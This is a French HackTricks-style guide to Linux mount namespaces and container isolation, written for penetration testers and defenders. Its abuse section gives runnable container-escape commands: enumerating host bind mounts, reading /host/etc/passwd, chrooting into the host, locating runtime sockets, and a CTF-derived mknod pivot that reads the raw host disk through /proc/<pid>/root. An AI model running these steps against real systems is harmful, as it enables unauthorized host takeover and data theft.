# Namespace de montage

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Le namespace de montage contrôle la **table de montage** qu'un processus voit. Il s'agit de l'une des fonctionnalités les plus importantes pour l'isolation des conteneurs, car le système de fichiers racine, les bind mounts, les montages tmpfs, la vue procfs, l'exposition de sysfs et de nombreux montages auxiliaires spécifiques au runtime sont tous définis dans cette table de montage. Deux processus peuvent tous deux accéder à `/`, `/proc`, `/sys` ou `/tmp`, mais la cible réelle de ces chemins dépend du namespace de montage dans lequel ils se trouvent.

Du point de vue de la sécurité des conteneurs, le namespace de montage fait souvent la différence entre « il s'agit d'un système de fichiers d'application préparé proprement » et « ce processus peut voir ou influencer directement le système de fichiers de l'hôte ». C'est pourquoi les bind mounts, les volumes `hostPath`, les opérations de montage privilégiées et les expositions inscriptibles de `/proc` ou `/sys` reposent tous sur ce namespace.

## Fonctionnement

Lorsqu'un runtime lance un conteneur, il crée généralement un namespace de montage vierge, prépare un système de fichiers racine pour le conteneur, monte procfs et les autres systèmes de fichiers auxiliaires nécessaires, puis ajoute éventuellement des bind mounts, des montages tmpfs, des secrets, des config maps ou des chemins de l'hôte. Une fois le processus exécuté dans ce namespace, l'ensemble des montages qu'il voit est largement découplé de la vue par défaut de l'hôte. L'hôte peut toujours voir le véritable système de fichiers sous-jacent, mais le conteneur voit la version assemblée pour lui par le runtime.

Cela est puissant, car le conteneur peut croire qu'il possède son propre système de fichiers racine, même si l'hôte continue de tout gérer. C'est également dangereux, car si le runtime expose le mauvais montage, le processus acquiert soudainement une visibilité sur des ressources de l'hôte que le reste du modèle de sécurité n'a peut-être pas été conçu pour protéger.

## Lab

Vous pouvez créer un namespace de montage privé avec :
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si vous ouvrez un autre shell en dehors de ce namespace et inspectez la table des montages, vous verrez que le montage tmpfs existe uniquement à l’intérieur du namespace de montage isolé. C’est un exercice utile, car il montre que l’isolation des montages n’est pas une théorie abstraite ; le kernel présente littéralement une table des montages différente au processus.
Si vous ouvrez un autre shell en dehors de ce namespace et inspectez la table des montages, le montage tmpfs existera uniquement à l’intérieur du namespace de montage isolé.

À l’intérieur des conteneurs, une comparaison rapide est :
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Le deuxième exemple montre à quel point une configuration du runtime peut créer une énorme brèche à travers la limite du système de fichiers.

## Utilisation du runtime

Docker, Podman, les stacks basées sur containerd et CRI-O reposent tous sur un mount namespace privé pour les conteneurs classiques. Kubernetes s'appuie sur le même mécanisme pour les volumes, les secrets projetés, les config maps et les mounts `hostPath`. Les environnements Incus/LXC reposent également fortement sur les mount namespaces, notamment parce que les conteneurs système exposent souvent des systèmes de fichiers plus riches et plus proches d'une machine que les conteneurs applicatifs.

Cela signifie que lorsque vous analysez un problème lié au système de fichiers d'un conteneur, vous n'examinez généralement pas une simple particularité de Docker. Vous examinez un problème de mount namespace et de configuration du runtime, exprimé par la plateforme ayant lancé le workload.

## Mauvaises configurations

L'erreur la plus évidente et la plus dangereuse consiste à exposer le système de fichiers racine de l'hôte ou un autre chemin sensible de l'hôte via un bind mount, par exemple `-v /:/host`, ou via un `hostPath` accessible en écriture dans Kubernetes. À ce stade, la question n'est plus « le conteneur peut-il d'une manière ou d'une autre s'échapper ? », mais plutôt « quelle quantité de données utiles de l'hôte est déjà directement visible et modifiable ? ». Un bind mount de l'hôte accessible en écriture transforme souvent le reste de l'exploit en une simple question de placement de fichiers, de chroot, de modification de configuration ou de découverte du runtime socket.

Un autre problème courant consiste à exposer le `/proc` ou le `/sys` de l'hôte d'une manière qui contourne la vue plus sûre du conteneur. Ces systèmes de fichiers ne sont pas de simples mounts de données ; ce sont des interfaces vers l'état du kernel et des processus. Si le workload atteint directement les versions de l'hôte, bon nombre des hypothèses sur lesquelles repose le hardening des conteneurs cessent de s'appliquer correctement.

Les protections en lecture seule sont également importantes. Un système de fichiers racine en lecture seule ne sécurise pas magiquement un conteneur, mais il supprime une grande partie de l'espace de staging de l'attaquant et rend plus difficiles la persistence, le placement de helper binaries et la modification de configuration. À l'inverse, une racine accessible en écriture ou un bind mount de l'hôte accessible en écriture donne à l'attaquant l'espace nécessaire pour préparer l'étape suivante.

## Abuse

Lorsque le mount namespace est mal utilisé, les attaquants font généralement l'une de quatre choses. Ils **lisent des données de l'hôte** qui auraient dû rester hors du conteneur. Ils **modifient la configuration de l'hôte** via des bind mounts accessibles en écriture. Ils **montent ou remontent des ressources supplémentaires** si les capabilities et seccomp l'autorisent. Ou ils **atteignent des sockets puissants et des répertoires d'état du runtime** qui leur permettent de demander à la plateforme de conteneurs elle-même davantage d'accès.

Si le conteneur peut déjà voir le système de fichiers de l'hôte, le reste du modèle de sécurité change immédiatement.

Lorsque vous suspectez la présence d'un bind mount de l'hôte, commencez par confirmer ce qui est disponible et si son accès en écriture est possible :
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si le système de fichiers racine de l’hôte est monté en lecture-écriture, l’accès direct à l’hôte est souvent aussi simple que :
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si l’objectif est d’obtenir un accès privilégié au runtime plutôt que d’effectuer un chroot direct, énumérez les sockets et l’état du runtime :
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` est présent, vérifiez également si de nouveaux mounts peuvent être créés depuis l'intérieur du container :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemple complet : Two-Shell `mknod` Pivot

Une voie d’abus plus spécialisée apparaît lorsque l’utilisateur root du container peut créer des périphériques bloc, que l’hôte et le container partagent une identité utilisateur exploitable, et que l’attaquant dispose déjà d’un foothold à faibles privilèges sur l’hôte. Dans cette situation, le container peut créer un nœud de périphérique tel que `/dev/sda`, et l’utilisateur à faibles privilèges sur l’hôte peut ensuite le lire via `/proc/<pid>/root/` pour le processus correspondant du container.<sup>[[1]](#references)</sup>

À l’intérieur du container :
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Depuis l’hôte, en tant que l’utilisateur correspondant à faibles privilèges après avoir localisé le PID du shell du conteneur :
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La leçon importante ne concerne pas la recherche exacte de chaînes CTF. Elle est que l’exposition du mount namespace via `/proc/<pid>/root/` peut permettre à un utilisateur de l’hôte de réutiliser des device nodes créés par le container, même lorsque la policy des devices cgroup empêchait leur utilisation directe à l’intérieur du container lui-même.<sup>[[1]](#references)</sup>

## Vérifications

Ces commandes servent à vous montrer la vue du filesystem dans laquelle le processus actuel s’exécute réellement. L’objectif est de repérer les mounts provenant de l’hôte, les chemins sensibles accessibles en écriture et tout ce qui semble plus étendu que le root filesystem d’un container d’application normal.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ce qui est intéressant ici :

- Les bind mounts provenant de l’hôte, en particulier `/`, `/proc`, `/sys`, les répertoires d’état du runtime ou les emplacements de sockets, doivent immédiatement attirer l’attention.
- Les montages read-write inattendus sont généralement plus importants qu’un grand nombre de montages auxiliaires read-only.
- `mountinfo` est souvent le meilleur endroit pour vérifier si un chemin provient réellement de l’hôte ou s’il est basé sur un overlay.

Ces vérifications permettent d’établir **quelles ressources sont visibles dans ce namespace**, **lesquelles proviennent de l’hôte** et **lesquelles sont accessibles en écriture ou sensibles du point de vue de la sécurité**.

## Références

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
